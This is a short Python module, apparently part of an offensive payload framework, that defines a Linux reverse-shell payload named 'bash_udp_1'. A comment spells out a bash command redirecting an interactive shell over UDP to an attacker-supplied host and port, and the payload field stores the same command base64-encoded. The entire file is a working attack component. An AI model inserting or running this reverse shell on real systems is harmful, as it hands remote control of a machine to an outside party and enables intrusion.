from lib.framework.core.payload import Payload


# bash -i >& /dev/udp/{LHOST}/{LPORT} 0>&1
class bash_udp_1(Payload):
    name = "bash_udp_1"
    platform = ["linux"]
    payload = "YmFzaCAtaSA+JiAvZGV2L3VkcC97TEhPU1R9L3tMUE9SVH0gMD4mMQ=="
